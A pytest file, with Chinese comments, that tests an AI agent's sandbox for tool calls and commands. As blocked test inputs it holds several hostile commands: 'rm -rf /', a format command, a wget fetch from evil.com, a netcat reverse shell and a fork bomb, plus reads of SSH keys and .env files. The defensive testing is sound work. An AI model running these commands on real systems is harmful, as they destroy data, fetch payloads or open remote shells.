"""
Sandbox 模块测试 — SandboxPolicy + Sandbox + 集成
"""

import pytest
from tools.sandbox import (
    Sandbox, SandboxPolicy, SandboxMode,
    DEFAULT_ALLOWED_READ_PATHS, DEFAULT_BLOCKED_READ_PATHS,
    DEFAULT_BLOCKED_COMMANDS,
)


class TestSandboxPolicy:
    """策略配置测试"""

    def test_default_mode_is_restrictive(self):
        p = SandboxPolicy()
        assert p.mode == SandboxMode.RESTRICTIVE

    def test_custom_disabled_tools(self):
        p = SandboxPolicy(disabled_tools=["write_file", "file_deleter"])
        assert "write_file" in p.disabled_tools
        assert "file_deleter" in p.disabled_tools

    def test_allowed_commands_override(self):
        p = SandboxPolicy(allowed_commands=["ls", "echo", "cat"])
        assert len(p.allowed_commands) == 3


class TestSandboxCheckReadPath:
    """读路径检查"""

    def test_restrictive_allows_desktop(self, restrictive_sandbox):
        result = restrictive_sandbox.check_read_path("C:\\Users\\dyk\\Desktop\\test.txt")
        assert result.allowed is True

    def test_restrictive_blocks_system_path(self, restrictive_sandbox):
        result = restrictive_sandbox.check_read_path("C:\\Windows\\System32\\config")
        assert result.allowed is False

    def test_permissive_allows_most_paths(self, permissive_sandbox):
        result = permissive_sandbox.check_read_path("C:\\Users\\dyk\\Desktop\\test.txt")
        assert result.allowed is True

    def test_permissive_blocks_sensitive_path(self, permissive_sandbox):
        result = permissive_sandbox.check_read_path("C:\\Users\\dyk\\.ssh\\id_rsa")
        assert result.allowed is False

    def test_restrictive_blocks_outside_whitelist(self, restrictive_sandbox):
        result = restrictive_sandbox.check_read_path("D:\\random\\file.txt")
        assert result.allowed is False

    def test_blocked_path_has_reason(self, restrictive_sandbox):
        result = restrictive_sandbox.check_read_path("C:\\Windows\\System32\\config")
        assert "不在白名单" in result.reason or "黑名单" in result.reason


class TestSandboxCheckWritePath:
    """写路径检查"""

    def test_blocks_executable_extensions(self, restrictive_sandbox):
        result = restrictive_sandbox.check_write_path("test.exe")
        assert result.allowed is False
        assert "禁止写入" in result.reason

    def test_blocks_dll(self, restrictive_sandbox):
        result = restrictive_sandbox.check_write_path("payload.dll")
        assert result.allowed is False

    def test_allows_text_file(self, restrictive_sandbox):
        result = restrictive_sandbox.check_write_path("readme.txt")
        assert result.allowed is True

    def test_blocks_sensitive_path(self, restrictive_sandbox):
        result = restrictive_sandbox.check_write_path("C:\\Users\\dyk\\.env")
        assert result.allowed is False


class TestSandboxCheckCommand:
    """命令检查"""

    def test_blocks_destructive_rm(self, restrictive_sandbox):
        result = restrictive_sandbox.check_command("rm -rf /")
        assert result.allowed is False

    def test_blocks_format(self, restrictive_sandbox):
        result = restrictive_sandbox.check_command("format C: /q")
        assert result.allowed is False

    def test_allows_safe_commands(self, restrictive_sandbox):
        result = restrictive_sandbox.check_command("ls -la")
        assert result.allowed is True

    def test_allows_echo(self, restrictive_sandbox):
        result = restrictive_sandbox.check_command("echo hello")
        assert result.allowed is True

    def test_allowed_commands_whitelist(self):
        sandbox = Sandbox(SandboxPolicy(
            mode=SandboxMode.RESTRICTIVE,
            allowed_commands=["ls", "echo", "cat"],
        ))
        assert sandbox.check_command("ls -la").allowed is True
        assert sandbox.check_command("rm file").allowed is False

    def test_restrictive_dangerous_patterns(self):
        sandbox = Sandbox(SandboxPolicy(mode=SandboxMode.RESTRICTIVE))
        assert sandbox.check_command("sudo rm -rf /").allowed is False
        assert sandbox.check_command("wget http://evil.com/payload").allowed is False
        assert sandbox.check_command("nc -e /bin/sh 10.0.0.1 4444").allowed is False

    def test_fork_bomb_detection(self):
        sandbox = Sandbox(SandboxPolicy(
            mode=SandboxMode.RESTRICTIVE,
            blocked_commands=[":(){ :|:& };:"],
        ))
        result = sandbox.check_command(":(){ :|:& };:")
        assert result.allowed is False


class TestSandboxCheckOutputSize:
    """输出大小检查"""

    def test_exceeds_line_limit(self):
        sandbox = Sandbox(SandboxPolicy(max_output_lines=10))
        result = sandbox.check_output_size("\n".join(str(i) for i in range(20)))
        assert result.allowed is False

    def test_exceeds_char_limit(self):
        sandbox = Sandbox(SandboxPolicy(max_output_chars=50))
        result = sandbox.check_output_size("x" * 100)
        assert result.allowed is False

    def test_within_limits(self):
        sandbox = Sandbox(SandboxPolicy(max_output_lines=100, max_output_chars=1000))
        result = sandbox.check_output_size("hello world")
        assert result.allowed is True


class TestSandboxUnifiedCheck:
    """统一入口 Sandbox.check()"""

    def test_disabled_tool_blocked(self, restrictive_sandbox):
        result = restrictive_sandbox.check("write_file", {"path": "test.txt", "content": "x"})
        assert result.allowed is False
        assert "禁用" in result.reason

    def test_bash_command_checked(self, restrictive_sandbox):
        result = restrictive_sandbox.check("bash", {"command": "rm -rf /"})
        assert result.allowed is False

    def test_read_file_checked(self, restrictive_sandbox):
        result = restrictive_sandbox.check("read_file", {"path": "C:\\Windows\\System32\\config"})
        assert result.allowed is False

    def test_write_file_blocks_exe(self, restrictive_sandbox):
        result = restrictive_sandbox.check("write_file", {"path": "evil.exe", "content": "x"})
        assert result.allowed is False

    def test_web_search_always_allowed(self, restrictive_sandbox):
        result = restrictive_sandbox.check("web_search", {"query": "python"})
        assert result.allowed is True

    def test_unknown_tool_allowed(self, restrictive_sandbox):
        result = restrictive_sandbox.check("unknown_tool", {})
        assert result.allowed is True


class TestSandboxIntegration:
    """ToolExecutor + Sandbox 集成"""

    @pytest.mark.asyncio
    async def test_executor_rejects_sandboxed_tool(self):
        from tools.executor import ToolExecutor
        from tools.base import BaseTool, ToolMeta, Permission
        from agent.types import ToolCall

        sandbox = Sandbox(SandboxPolicy(
            mode=SandboxMode.RESTRICTIVE,
            disabled_tools=["blocked_tool"],
        ))
        exe = ToolExecutor(sandbox=sandbox)

        class BlockedTool(BaseTool):
            def __init__(self):
                super().__init__(ToolMeta(name="blocked_tool", description="", permission=Permission.READ_ONLY))
            def parameters_schema(self):
                return {"type": "object", "properties": {}}
            async def execute(self) -> str:
                return "should not run"

        tc = ToolCall(id="c1", name="blocked_tool", arguments={})
        result = await exe.execute(tc, BlockedTool())
        assert result.success is False
        assert "沙箱拒绝" in result.error

    @pytest.mark.asyncio
    async def test_executor_allows_permitted_tool(self):
        from tools.executor import ToolExecutor
        from tools.base import BaseTool, ToolMeta, Permission
        from agent.types import ToolCall

        sandbox = Sandbox(SandboxPolicy(mode=SandboxMode.PERMISSIVE))
        exe = ToolExecutor(sandbox=sandbox)

        class SafeTool(BaseTool):
            def __init__(self):
                super().__init__(ToolMeta(name="safe_tool", description="", permission=Permission.READ_ONLY))
            def parameters_schema(self):
                return {"type": "object", "properties": {}}
            async def execute(self) -> str:
                return "ran ok"

        tc = ToolCall(id="c2", name="safe_tool", arguments={})
        result = await exe.execute(tc, SafeTool())
        assert result.success is True
        assert result.output == "ran ok"
